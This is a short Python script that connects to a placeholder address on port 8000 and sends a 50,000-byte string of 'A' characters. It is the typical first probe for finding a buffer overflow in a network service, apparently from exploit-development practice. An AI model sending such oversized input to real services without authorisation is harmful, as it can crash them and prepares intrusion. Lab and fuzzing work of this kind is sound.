#!/usr/bin/python3
# -*- encoding: utf-8 -*-
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('endereco', 8000))
s.send(b'A'*50000 + b'F')
s.close()